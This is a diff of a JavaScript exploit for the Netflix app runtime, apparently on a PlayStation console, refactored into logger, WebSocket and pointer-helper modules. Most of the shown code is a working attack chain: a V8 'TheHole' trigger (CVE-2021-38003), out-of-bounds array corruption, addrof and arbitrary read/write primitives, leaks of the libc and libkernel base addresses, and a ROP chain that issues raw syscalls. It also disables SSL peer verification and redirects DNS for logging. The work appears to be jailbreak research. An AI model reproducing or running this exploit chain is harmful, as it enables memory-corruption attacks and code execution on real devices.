@@ -2,41 +2,177 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-// ROP and Syscall PoC by c0w-ar
+// #region WebSocket
+const ws = {
+    socket: null,
+    init(ip, port, callback) {
+        nrdp.gibbon._runConsole("/command ssl-peer-verification false");
 
-var bs = new ArrayBuffer(8);
-var fs = new Float64Array(bs);
-var is = new BigUint64Array(bs);
+        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
+            addresses: [ip],
+            ttl: 3600000
+        });
 
-/* converts a float to a 64-bit uint */
-function ftoi(x) {
-    fs[0] = x;
-    return is[0];
+        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
+        this.socket.onopen = callback;
+    },
+    send(msg) {
+        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
+            this.socket.send(msg);
+        }
+    }
 }
+// #endregion
+// #region Logger
+const logger = {
+    overlay: null,
+    lines: [],
+    maxLines: 40,
+    refreshTimer: null,
+    init() {
+        this.overlay = nrdp.gibbon.makeWidget({
+            name: "dbg",
+            width: 1280,
+            height: 720,
+            backgroundColor: "#000000"
+        });
+    
+        nrdp.gibbon.scene.overlay = this.overlay;
+    },
+    log(msg) {
+        ws.send(msg);
+        this.lines.push(msg);
+        if (this.lines.length > this.maxLines) this.lines.shift();
+        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
+        this.refreshTimer = nrdp.setTimeout(() => {
+            this.refresh();
+            this.refreshTimer = null;
+        }, 50);
+    },
+    refresh() {
+        if (!this.overlay) return;
+        if (this.overlay.children) {
+            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
+                var child = this.overlay.children[j];
+                if (child && child._name && child._name.startsWith("ln")) {
+                    this.overlay.removeChild(child);
+                }
+            }
+        }
 
-/* converts a 64-bit uint to a float */
-function itof(x) {
-    is[0] = x;
-    return fs[0];
+        for (var i = 0; i < this.lines.length; i++) {
+            var w = nrdp.gibbon.makeWidget({
+                name: "ln" + i,
+                x: 10,
+                y: 10 + (i * 17),
+                width: 1260,
+                height: 15
+            });
+            
+            w.text = {
+                contents: this.lines[i],
+                size: 12,
+                color: {
+                    a: 255,
+                    r: 0,
+                    g: 255,
+                    b: 0
+                },
+                wrap: false
+            };
+
+            w.parent = this.overlay;
+        }
+    }
 }
+// #endregion
+// #region Pointer Helpers
+const buf = new ArrayBuffer(8);
+const view = new DataView(buf);
+const ptr = {
+    il2ih(value) {
+        return value << 0x20n;
+    },
+    ih2il(value) {
+        return value >> 0x20n;
+    },
+    ih(value) {
+        return value & ~0xFFFFFFFFn;
+    },
+    il(value) {
+        return value & 0xFFFFFFFFn;
+    },
+    itag(value) {
+    	return value | 1n;
+    },
+    iuntag(value) {
+    	return value & ~1n;
+    },
+    f2i(value) {
+        view.setFloat64(0, value, true);
+        return view.getBigUint64(0, true);
+    },
+    f2ih(value) {
+        view.setFloat64(0, value, true);
+        return BigInt(view.getUint32(4, true));
+    },
+    f2il(value) {
+        view.setFloat64(0, value, true);
+        return BigInt(view.getUint32(0, true));
+    },
+    i2f(value) {
+        view.setBigUint64(0, value, true);
+        return view.getFloat64(0, true);
+    },
+    i2h(value, padded = true) {
+        let str = value.toString(16).toUpperCase();
+        if (padded) {
+            str = str.padStart(16, '0');
+        }
+        return `0x${str}`;
+    }
+}
+// #endregion
 
-function trigger() {
+function make_hole () {
     let v1;
-
-    function f0(v4) { v4(() => {}, v5 => { v1 = v5.errors; }); }
-
-    f0.resolve = (v6) => { return v6; };
-
-    let v3 = { then(v7, v8) { v8(); } };
-
+    function f0(v4) {
+        v4(() => { }, v5 => {
+            v1 = v5.errors;
+        });
+    }
+    f0.resolve = function (v6) {
+        return v6;
+    };
+    let v3 = {
+        then(v7, v8) {
+            v8();
+        }
+    };
     Promise.any.call(f0, [v3]);
-
     return v1[1];
+}
+
+function make_hole_old () {
+    let a = [], b = [];
+    let s = '"'.repeat(0x800000);
+    a[20000] = s;
+
+    for (let i = 0; i < 10; i++) a[i] = s;
+    for (let i = 0; i < 10; i++) b[i] = a;
+
+    try {
+        JSON.stringify(b);
+    } catch (hole) {
+        return hole;
+    }
+
+    throw new Error('Could not trigger TheHole');
 }
 
 function hex(value)
 {
-    return "0x" + value.toString(16).padStart(8, "0");
+  return "0x" + value.toString(16).padStart(8, "0");
 }
 
 class gadgets {
@@ -87,101 +223,17 @@ class gadgets {
     }
 }
 
-(function() {
-    var overlay = null;
-    var lines = [];
-    var maxLines = 40;
-    var refreshTimer = null;
+function main () {
     
+    logger.init();
     
-    function send_to_old_gen(){
-        for (var i = 0; i < 10 ; i++){
-                nrdp.gibbon.garbageCollect();
-            }
-    }
-    
-    function disable_gc(){ //yeah right lol
-        time = -1 //9999999999
-        nrdp.script.garbageCollectTimeout = time;
-        nrdp.gibbon.garbageCollectTimeout = time;
-        nrdp.options.garbage_collect_timeout = time;
-    }
-    
-    var netlog = function(msg) {
-        try {
-            nrdp.gibbon.load({
-                url: "https://10.0.0.2/?log=" + encodeURIComponent(msg),
-                requestMethod: "GET",
-                secure: false
-            }, function() {});
-        } catch (ex) {}
-    };
-
-    var log = function(msg) {
-        netlog(msg);
-        lines.push(msg);
-        if (lines.length > maxLines) lines.shift();
-        if (refreshTimer) nrdp.clearTimeout(refreshTimer);
-        refreshTimer = nrdp.setTimeout(function() {
-            refresh();
-            refreshTimer = null;
-        }, 50);
-    };
-
-    function refresh() {
-        if (!overlay) return;
-        if (overlay.children) {
-            for (var j = overlay.children.length - 1; j >= 0; j--) {
-                var child = overlay.children[j];
-                if (child && child._name && child._name.startsWith("ln")) {
-                    overlay.removeChild(child);
-                }
-            }
-        }
-        for (var i = 0; i < lines.length; i++) {
-            var w = nrdp.gibbon.makeWidget({
-                name: "ln" + i,
-                x: 10,
-                y: 10 + (i * 17),
-                width: 1260,
-                height: 15
-            });
-            w.text = {
-                contents: lines[i],
-                size: 8,
-                color: {
-                    a: 255,
-                    r: 0,
-                    g: 255,
-                    b: 0
-                },
-                wrap: false
-            };
-            w.parent = overlay;
-        }
-    }
-
-    overlay = nrdp.gibbon.makeWidget({
-        name: "dbg",
-        width: 1280,
-        height: 720,
-        backgroundColor: "#000000"
-    });
-    nrdp.gibbon.scene.overlay = overlay;
-
-    nrdp.gibbon._runConsole("/command ssl-peer-verification false");
-    nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
-        addresses: ["10.0.0.2"],
-        ttl: 3600000
-    });
-
-    log("=== Netflix n Hack ===");
+    logger.log("=== Netflix n Hack ===");
 
     try {
 
         const g = new gadgets(); // Load gadgets
 
-        let hole = trigger();
+        let hole = make_hole();
 
         let string = "TEXT";
 
@@ -203,8 +255,8 @@ class gadgets {
         map1.set(oob_arr_temp, 0x200);
         
         // Let's make oob_arr oversize
-        oob_arr_temp[18] = itof(0x1000n*8n);  // Size in bytes
-        oob_arr_temp[19]= itof(0x1000n);      // Size in elements
+        oob_arr_temp[18] = ptr.i2f(0x1000n*8n);  // Size in bytes
+        oob_arr_temp[19]= ptr.i2f(0x1000n);      // Size in elements
 
         // From this point on we can use oob_arr as a more 'stable' primitive until fake objs
 
@@ -280,24 +332,24 @@ class gadgets {
         
         
         let add_string = addrof_unstable(string) + 12n;
-        log("Address of 'string' text: " + hex(add_string));
-        log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;
+        logger.log("Address of 'string' text: " + hex(add_string));
+        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;
 
         write32_unstable(add_string, 0x41414141n);
-        log("Overwritten value of 'string' (should be AAAA): " + string );
+        logger.log("Overwritten value of 'string' (should be AAAA): " + string );
         
         let typed_arr = new Int8Array(8);
         let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
         let top32b_heap = base_heap_add >> 32n;
-        log("Base heap address: " + hex(base_heap_add));
-        log("Top 32bits heap address: " + hex(top32b_heap));
+        logger.log("Base heap address: " + hex(base_heap_add));
+        logger.log("Top 32bits heap address: " + hex(top32b_heap));
         let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
         let eboot_base = leak_eboot_add - 0x8966C8n; // This is not realiable as the addess changes
         // Previously used offsets: 0x88C76En , 0x8966C8n
         // Seems to be a ptr that the app updates while running
         // If nothing is changed in the code before this point, it should not change
-        log("Leaked eboot add : " + hex(leak_eboot_add));
-        log("eboot base : " + hex(eboot_base));
+        logger.log("Leaked eboot add : " + hex(leak_eboot_add));
+        logger.log("eboot base : " + hex(eboot_base));
         
         
         /***** Start of Stable Primitives based on fake obj *****/
@@ -321,13 +373,13 @@ class gadgets {
         const stable_array_addr = addrof_unstable(stable_array);
         const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
               
-        log('Large Object Space @ ' + hex(stable_elements_addr));
+        logger.log('Large Object Space @ ' + hex(stable_elements_addr));
         
         // Transform elements to FixedDoubleArray
         // This makes GC happy later
         write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
         
-        log('Converted stable_array to double array');
+        logger.log('Converted stable_array to double array');
         
         for (let i = 0; i < stable_array.length; i++) {
             stable_array[i] = 0;
@@ -366,7 +418,7 @@ class gadgets {
         const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
         const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);
 
-        log('Templates extracted');
+        logger.log('Templates extracted');
 
 
         const base = stable_elements_addr + 0x100n;
@@ -606,16 +658,16 @@ class gadgets {
             const buffer_addr = addrof(buffer);
             const backing_store = read64(buffer_addr + 0x14n);
             allocated_buffers.push(buffer);
-            log("Returned backing_store in malloc: " + hex(backing_store) );
+            logger.log("Returned backing_store in malloc: " + hex(backing_store) );
             return backing_store;
         }
 
-        log("Stable Primitives Achieved.");
+        logger.log("Stable Primitives Achieved.");
 
         const rop_chain = new BigUint64Array(0x1000);
         const rop_address = get_backing_store(rop_chain);
-        log("Address of ROP obj: " + hex(addrof(rop_chain)) );
-        log("Address of ROP: " + hex(rop_address) );
+        logger.log("Address of ROP obj: " + hex(addrof(rop_chain)) );
+        logger.log("Address of ROP: " + hex(rop_address) );
 
         function rop_smash (x) {
           let a = 100;
@@ -625,7 +677,7 @@ class gadgets {
         let value_delete = rop_smash(1); // Generate Bytecode
 
         add_rop_smash = addrof(rop_smash);
-        log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
+        logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
         add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
@@ -634,17 +686,17 @@ class gadgets {
         const add_fake_frame = addrof(fake_frame);
         const white_space_2 = new BigInt64Array(8);
         const white_space_3 = new BigInt64Array(8);
-        log("Address of fake_frame: 0x" + hex(add_fake_frame) );
+        logger.log("Address of fake_frame: 0x" + hex(add_fake_frame) );
 
         const fake_bytecode_buffer = new BigUint64Array(8);
         const add_fake_bytecode_store = get_backing_store(fake_bytecode_buffer);
-        log("Address of fake_bytecode_buffer: " + hex(addrof(fake_bytecode_buffer)) );
-        log("Address of add_fake_bytecode_store: " + hex(add_fake_bytecode_store) );
+        logger.log("Address of fake_bytecode_buffer: " + hex(addrof(fake_bytecode_buffer)) );
+        logger.log("Address of add_fake_bytecode_store: " + hex(add_fake_bytecode_store) );
 
         const return_value_buffer = new BigUint64Array(8);
         const return_value_addr = get_backing_store(return_value_buffer);
-        log("Address of return_value_buffer: " + hex(addrof(return_value_buffer)) );
-        log("Address of return_value_buffer_store: " + hex(return_value_addr) );
+        logger.log("Address of return_value_buffer: " + hex(addrof(return_value_buffer)) );
+        logger.log("Address of return_value_buffer_store: " + hex(return_value_addr) );
 
         fake_bytecode_buffer[0] = 0xABn;
         fake_bytecode_buffer[1] = 0x00n;
@@ -733,39 +785,39 @@ class gadgets {
 
         /***** LibC *****/
         const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
-        log("libc base : " + hex(libc_base));
+        logger.log("libc base : " + hex(libc_base));
         const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
-        log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
+        logger.log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
         const syscall_wrapper = gettimeofdayAddr + 0x7n;
-        log("syscall_wrapper : " + hex(syscall_wrapper));
+        logger.log("syscall_wrapper : " + hex(syscall_wrapper));
         const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
 
         const mod_info = malloc(0x300);
         const SEGMENTS_OFFSET = 0x160n;
         
         ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
-        log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
+        logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
 
         if (ret !== 0x0n) {
-            log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
+            logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
             throw new Error("sceKernelGetModuleInfoFromAddr failed");
         }
         
         /***** LibKernel *****/
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
-        log("libkernel_base @ " + hex(libkernel_base));
+        logger.log("libkernel_base @ " + hex(libkernel_base));
 
         function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
         {
-            log("Enter syscall syscall_num : " + hex(syscall_num) );
-            log("Enter syscall arg1 : " + hex(arg1) );
-            log("Enter syscall arg2 : " + hex(arg2) );
-            log("Enter syscall arg3 : " + hex(arg3) );
+            logger.log("Enter syscall syscall_num : " + hex(syscall_num) );
+            logger.log("Enter syscall arg1 : " + hex(arg1) );
+            logger.log("Enter syscall arg2 : " + hex(arg2) );
+            logger.log("Enter syscall arg3 : " + hex(arg3) );
             
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
             
             return_value = return_value_buffer[0];
-            log("Returning from rop - value: " + hex(return_value));
+            logger.log("Returning from rop - value: " + hex(return_value));
             return return_value;
         }
         
@@ -858,8 +910,9 @@ class gadgets {
         send_notification("Netflix-n-Hack ;)");
 
     } catch (e) {
-        log("EXCEPTION: " + e.message);
-        log(e.stack);
+        logger.log("EXCEPTION: " + e.message);
+        logger.log(e.stack);
     }
+}
 
-})();
+ws.init("10.0.0.2", 1337, main);
